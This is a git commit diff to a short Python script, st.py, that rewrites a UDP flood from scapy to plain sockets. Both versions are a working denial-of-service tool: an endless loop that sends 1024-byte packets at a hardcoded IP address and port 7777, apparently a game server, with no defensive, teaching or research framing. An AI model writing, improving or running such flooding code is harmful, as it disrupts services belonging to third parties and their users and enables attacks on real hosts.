f095897c4b05f09490fc931c9d51e0670e6738df
MAGIC HOSTING <112265944+HiloDevnn@users.noreply.github.com>
2024-04-14 23:48:44 +0100

    Update st.py

--- st.py
+++ st.py
@@ -1,11 +1,11 @@
-from scapy.all import *
+import socket
 
 target_ip = "164.92.234.227"
 target_port = 7777
 
 def udp_flood(target_ip, target_port):
     while True:
-        packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="A"*1024)
-        send(packet, verbose=0)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(b"A"*1024, (target_ip, target_port))
 
 udp_flood(target_ip, target_port)
